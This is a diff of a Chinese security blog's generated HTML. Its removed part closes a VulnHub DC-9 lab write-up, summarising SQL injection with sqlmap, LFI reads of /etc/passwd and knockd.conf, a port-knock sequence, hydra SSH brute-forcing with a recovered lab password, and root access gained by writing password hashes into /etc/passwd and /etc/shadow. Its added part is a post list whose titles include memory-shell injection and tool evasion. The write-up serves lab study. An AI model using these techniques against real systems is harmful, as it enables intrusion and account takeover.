123456</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><strong>📋 测试总结（可能是我环境问题）：</strong></p>
-<table>
-<thead>
-<tr>
-<th>方式</th>
-<th>结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>passwd 无密码 <code>::</code></td>
-<td>❌ PAM 强制要求密码不能为空</td>
-</tr>
-<tr>
-<td>passwd 写 MD5 哈希（<code>-1</code>）</td>
-<td>❌ 系统去 shadow 找，找不到拒绝</td>
-</tr>
-<tr>
-<td>passwd 写 DES 哈希（不加参数）</td>
-<td>✅ 直接在 passwd 验证，成功</td>
-</tr>
-<tr>
-<td>shadow 写 SHA-512 哈希（<code>-6</code>）</td>
-<td>✅ 正常验证，成功</td>
-</tr>
-</tbody></table>
-</blockquote>
-<p>最终拿到 root，取得 flag：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image32.png"></p>
-<hr>
-<h2 id="八、渗透流程总结"><a href="#八、渗透流程总结" class="headerlink" title="八、渗透流程总结"></a>八、渗透流程总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">信息收集（nmap）→ 发现 SSH filtered（knockd） + Web 80</span><br><span class="line">    ↓</span><br><span class="line">发现搜索功能 → Burp Suite 抓包 → sqlmap POST 注入</span><br><span class="line">    → 拿到哈希 → hashes.com 破解 → 登录后台</span><br><span class="line">    ↓</span><br><span class="line">发现「文件不存在」提示 → LFI 读取 /etc/passwd</span><br><span class="line">    → 读取 /etc/knockd.conf → 获取敲门序列 7469→8475→9842</span><br><span class="line">    ↓</span><br><span class="line">knock 敲门 → SSH 22 端口开放</span><br><span class="line">    ↓</span><br><span class="line">hydra 第一轮爆破 → chandlerb/joeyt/janitor</span><br><span class="line">    → janitor 目录发现新密码</span><br><span class="line">    → hydra 第二轮爆破 → fredf/B4-Tru3-001</span><br><span class="line">    ↓</span><br><span class="line">fredf sudo 分析 test.py → 可以 root 身份写入任意文件</span><br><span class="line">    ↓</span><br><span class="line">写入 /etc/shadow（SHA-512 哈希）+ /etc/passwd → su 新用户 → root</span><br><span class="line">    ↓</span><br><span class="line">cat /root/theflag.txt → flag ✅</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="九、涉及工具汇总"><a href="#九、涉及工具汇总" class="headerlink" title="九、涉及工具汇总"></a>九、涉及工具汇总</h2><table>
-<thead>
-<tr>
-<th>工具</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>nmap</td>
-<td>端口扫描、服务识别</td>
-</tr>
-<tr>
-<td>Burp Suite</td>
-<td>抓包获取 POST 数据</td>
-</tr>
-<tr>
-<td>sqlmap</td>
-<td>POST 注入自动化利用</td>
-</tr>
-<tr>
-<td>hashes.com</td>
-<td>在线哈希解密</td>
-</tr>
-<tr>
-<td>dirsearch</td>
-<td>Web 目录扫描</td>
-</tr>
-<tr>
-<td>LFI</td>
-<td>读取敏感配置文件</td>
-</tr>
-<tr>
-<td>knock</td>
-<td>Port Knocking 敲门</td>
-</tr>
-<tr>
-<td>hydra</td>
-<td>SSH 密码爆破</td>
-</tr>
-<tr>
-<td>openssl</td>
-<td>生成 passwd&#x2F;shadow 哈希</td>
-</tr>
-<tr>
-<td>strings</td>
-<td>提取二进制文件可读字符串</td>
-</tr>
-</tbody></table>
-<hr>
-<blockquote>
-<p>本文为 VulnHub DC-9 靶机学习笔记，DC 系列最终章。所有操作均在本地搭建的靶场环境中完成，仅用于学习交流。</p>
-</blockquote>
-</article>
-<div class="article-footer">
-    <section id="license">
-      <div class="header"><span>许可协议</span></div>
-      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div>
-    </section>
+
+<div id="post-container">
+  <div class="post-list post grid"><a class="post-card post" href="/posts/eb030935/">
+<article class="md-text"><div class="post-cover"><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/4d438cbe94b6b665403e80f0294dcfba.jpg"/></div><h2 class="post-title">代码审计 | Servlet —— Tomcat 内存马</h2><div class="excerpt"><p>代码审计 | Servlet —— Tomcat 内存马
+系列：Tomcat 内存马 —— 继 Filter 型之后，聊聊 Servlet 型的动态注入。
+
+
+目录
+一、Servlet 是如何注册和工作的
+二、Filter 和 Servlet 的区别
+三、回顾对比：Filter 型 vs Servlet 型
+四、前置知识：Servlet 动态注册 API
+五、直接调用 addServlet ...</p></div><div class="meta cap"><span class="cap" id="post-meta"><time datetime="2026-04-09T04:00:00.000Z">2026-04-09</time></span><span class="cap breadcrumb"><span>代码审计</span></span></div></article>
+</a></div>
+</div>
+
+<div id="paginator-wrapper">
+  
+
+</div>
+
+<script>
+  // 所有文章数据（用于仅标题布局）
+  // eslint-disable-next-line
+  const allPostsData = [{"title":"代码审计 | Filter —— Tomcat 内存马从零到注入","path":"posts/7b9eb72d/","link":""},{"title":"代码审计 | Servlet —— Tomcat 内存马","path":"posts/eb030935/","link":""},{"title":"代码审计 | Log4j2 —— CVE-2021-44228  JNDI 注入与递归解析的完整链路分析","path":"posts/d5ebc61e/","link":""},{"title":"代码审计 | Shiro-550 —— CVE-2016-4437 环境搭建 调试分析 漏洞利用","path":"posts/a7f3c8e2/","link":""},{"title":"代码审计 | CB链分析 —— CommonsBeanutils 反序列化利用链","path":"posts/c4b8e2a3/","link":""},{"title":"代码审计 | CC2 链 —— _tfactory 赋值问题 PriorityQueue 新入口","path":"posts/d7f9a3c1/","link":""},{"title":"代码审计 | CC3链 —— 实例化 vs 反序列化 InvokerTransformer vs InstantiateTransformer","path":"posts/c3e8b7f2/","link":""},{"title":"代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial","path":"posts/a7b3c9d2/","link":""},{"title":"代码审计 | CC1 LazyMap 链 —— 动态代理","path":"posts/d4f8a2c1/","link":""},{"title":"工具魔改 | Cobalt Strike 4.7 特征修改与流量混淆","path":"posts/bb2a3f37/","link":""},{"title":"代码审计 | CC1 TransformedMap 链 ——前言  反向调试 构造Payload","path":"posts/becfd9ce/","link":""},{"title":"代码审计 | FastJSON 1.2.47 不出网利用 —— BCEL 链分析 | setter 与 getter 触发对比","path":"posts/e90faa78/","link":""},{"title":"代码审计 | FastJSON 1.2.47 不出网利用 —— TemplatesImpl 链分析","path":"posts/f70df821/","link":""},{"title":"代码审计 | FastJSON 1.2.47 缓存绕过漏洞分析","path":"posts/5ef1061b/","link":""},{"title":"代码审计 | FastJSON 反序列化分析：1.2.25 / 1.2.42 / 1.2.43","path":"posts/86d6dbe4/","link":""},{"title":"代码审计 | FastJson 1.2.24 反序列化 RCE 漏洞分析","path":"posts/3035988a/","link":""},{"title":"THP-CSK 靶场 Linux 内网横向渗透全流程","path":"posts/5532e4a/","link":""},{"title":"工具魔改 | 魔改哥斯拉 - 反编译重打包与Webshell免杀对抗","path":"posts/55d71cb8/","link":""},{"title":"工具魔改 | Fscan 魔改二开 - 特征消除与功能扩展","path":"posts/e39557c4/","link":""},{"title":"工具魔改 | sqlmap 魔改研究 - 从流量特征到 WAF 对抗","path":"posts/5ddd3711/","link":""},{"title":"笔记 | 常见Linux权限提升笔记","path":"posts/a6c6e02f/","link":""},{"title":"笔记 | CTF 伪协议","path":"posts/58685328/","link":""},{"title":"VulnHub DC-9 靶机渗透测试笔记","path":"posts/f10adb67/","link":""},{"title":"VulnHub DC-8 靶机渗透测试笔记","path":"posts/16177df0/","link":""},{"title":"VulnHub DC-7 靶机渗透测试笔记","path":"posts/9bfd2b6a/","link":""},{"title":"VulnHub DC-6 靶机渗透测试笔记","path":"posts/7ce08dfd/","link":""},{"title":"VulnHub DC-5 靶机渗透测试笔记","path":"posts/8eb76005/","link":""},{"title":"VulnHub DC-4 靶机渗透测试笔记","path":"posts/69aac692/","link":""},{"title":"VulnHub DC-3 靶机渗透测试笔记","path":"posts/b169bdb4/","link":""},{"title":"VulnHub DC-2 靶机渗透测试笔记","path":"posts/56741b23/","link":""},{"title":"VulnHub DC-1 靶机渗透测试笔记","path":"posts/a423f6db/","link":""},{"title":"DVWA 靶场实验报告 (High Level)","path":"posts/f46202bc/","link":""},{"title":"DVWA 靶场实验报告 (Medium Level)","path":"posts/fab7f2d4/","link":""},{"title":"DVWA 靶场实验报告 (Low Level)","path":"posts/f02c2786/","link":""},{"title":"Pikachu 靶场通关笔记","path":"posts/31fdd992/","link":""}];
+  
+  // 布局切换功能
+  (function() {
+    const layoutButtons = document.querySelectorAll('.layout-btn[data-layout]');
+    const postContainer = document.getElementById('post-container');
+    const paginatorWrapper = document.getElementById('paginator-wrapper');
     
-
-</div>
-
-
-
-
-
-
+    // 保存原始分页HTML
+    const originalHTML = postContainer.innerHTML;
+    
+    // 从localStorage加载保存的布局
+    const savedLayout = localStorage.getItem('Stellar.layout') || 'grid';
+    
+    // 渲染所有文章（仅标题模式）
+    function renderAllPosts() {
+      let html = '<div class="post-list post title-only">';
+      allPostsData.forEach(function(post) {
+        html += `<a class="post-card" href="${post.link || '/' + post.path}">`;
+        html += `<div class="post-title">${post.title}</div>`;
+        html += '</a>';
+      });
+      html += '</div>';
+      postContainer.innerHTML = html;
+    }
+    
+    // 应用布局
+    function applyLayout(layout) {
+      // 更新按钮状态
+      layoutButtons.forEach(btn => {
+        btn.classList.remove('active');
+        if (btn.dataset.layout === layout) {
+          btn.classList.add('active');
+        }
+      });
+      
+      // 仅标题布局：显示所有文章
+      if (layout === 'title-only') {
+        renderAllPosts();
+        paginatorWrapper.style.display = 'none';
+      } else {
+        // 其他布局：恢复原始分页HTML
+        postContainer.innerHTML = originalHTML;
+        let postList = postContainer.querySelector('.post-list');
+        postList.classList.remove('list', 'grid', 'compact', 'title-only');
+        postList.classList.add(layout);
+        paginatorWrapper.style.display = 'block';
+      }
+      
+      // 保存布局到localStorage
+      localStorage.setItem('Stellar.layout', layout);
+      
+      // 触发成就
+      if (window.secret && window.secret.layoutSwitch) {
+        window.secret.layoutSwitch();
+      }
+    }
+    
+    // 绑定布局按钮点击事件
+    layoutButtons.forEach(btn => {
+      btn.addEventListener('click', function() {
+        const layout = this.dataset.layout;
+        applyLayout(layout);
+      });
+    });
+    
+    // 初始化
+    applyLayout(savedLayout);
+  })();
+</script>
 <footer class="page-footer footnote"><hr><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
 <div class="widgets">
-
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VulnHub-DC-9-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0"><span class="toc-text">VulnHub DC-9 靶机渗透测试笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">1.1 主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E7%AB%AF%E5%8F%A3%E4%B8%8E%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="toc-text">1.2 端口与服务扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL-%E6%B3%A8%E5%85%A5"><span class="toc-text">二、SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%8F%91%E7%8E%B0%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">2.1 发现注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E7%A0%B4%E8%A7%A3%E5%93%88%E5%B8%8C"><span class="toc-text">2.2 破解哈希</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-text">2.3 登录后台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88LFI%EF%BC%89"><span class="toc-text">三、文件包含漏洞（LFI）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%8F%91%E7%8E%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">3.1 发现文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E7%94%A8-LFI-%E8%AF%BB%E5%8F%96-knockd-conf"><span class="toc-text">3.2 用 LFI 读取 knockd.conf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Port-Knocking-%E6%95%B2%E9%97%A8"><span class="toc-text">四、Port Knocking 敲门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81SSH-%E7%88%86%E7%A0%B4"><span class="toc-text">五、SSH 爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-text">5.1 提取数据库账号密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E7%AC%AC%E4%B8%80%E8%BD%AE%E7%88%86%E7%A0%B4"><span class="toc-text">5.2 第一轮爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E7%BF%BB%E7%94%A8%E6%88%B7%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0%E6%96%B0%E5%AF%86%E7%A0%81"><span class="toc-text">5.3 翻用户目录发现新密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-%E7%AC%AC%E4%BA%8C%E8%BD%AE%E7%88%86%E7%A0%B4"><span class="toc-text">5.4 第二轮爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%88%86%E6%9E%90-test-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-text">六、分析 test 二进制文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-text">6.1 查看文件内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-text">6.2 分析源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-text">七、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E5%B0%9D%E8%AF%95%E6%97%A0%E5%AF%86%E7%A0%81%E5%86%99%E5%85%A5-passwd%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-text">7.1 尝试无密码写入 passwd（失败）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E5%B0%9D%E8%AF%95-MD5-%E5%93%88%E5%B8%8C%E5%86%99%E5%85%A5-passwd%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-text">7.2 尝试 MD5 哈希写入 passwd（失败）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E6%88%90%E5%8A%9F%E6%8F%90%E6%9D%83-%F0%9F%8E%89"><span class="toc-text">7.3 成功提权 🎉</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93"><span class="toc-text">八、渗透流程总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E6%B6%89%E5%8F%8A%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB"><span class="toc-text">九、涉及工具汇总</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+<widget class="widget-wrapper linklist collapsible-widget"><div class="widget-header dis-select"><span class="name">文章分类</span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="linklist left style-1" style="grid-template-columns:repeat(1,1fr);"><div class="category-group"><a class="link" title="web" href="/categories/web/"><div class="flex"><span>web</span><span class="count">4</span></div></a><div class="children-list"><a class="link child-link" title="DVWA" href="/categories/web/DVWA/"><div class="flex"><span>DVWA</span><span class="count">3</span></div></a><a class="link child-link" title="pikachu" href="/categories/web/pikachu/"><div class="flex"><span>pikachu</span><span class="count">1</span></div></a></div></div><div class="category-group"><a class="link" title="linux" href="/categories/linux/"><div class="flex"><span>linux</span><span class="count">10</span></div></a><div class="children-list"><a class="link child-link" title="vulnhub-DC" href="/categories/linux/vulnhub-DC/"><div class="flex"><span>vulnhub-DC</span><span class="count">9</span></div></a><a class="link child-link" title="靶机渗透" href="/categories/linux/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"><div class="flex"><span>靶机渗透</span><span class="count">1</span></div></a></div></div><div class="category-group"><a class="link" title="代码审计" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><div class="flex"><span>代码审计</span><span class="count">15</span></div></a><div class="children-list"><a class="link child-link" title="cc" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/cc/"><div class="flex"><span>cc</span><span class="count">5</span></div></a><a class="link child-link" title="shiro" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/shiro/"><div class="flex"><span>shiro</span><span class="count">2</span></div></a><a class="link child-link" title="内存马" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%86%85%E5%AD%98%E9%A9%AC/"><div class="flex"><span>内存马</span><span class="count">2</span></div></a><a class="link child-link" title="log4j" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/log4j/"><div class="flex"><span>log4j</span><span class="count">1</span></div></a><a class="link child-link" title="fastjson" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson/"><div class="flex"><span>fastjson</span><span class="count">5</span></div></a></div></div><a class="link" title="工具魔改" href="/categories/%E5%B7%A5%E5%85%B7%E9%AD%94%E6%94%B9/"><div class="flex"><span>工具魔改</span><span class="count">4</span></div></a><a class="link" title="笔记" href="/categories/%E7%AC%94%E8%AE%B0/"><div class="flex"><span>笔记</span><span class="count">2</span></div></a></div></div></widget>
 </div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
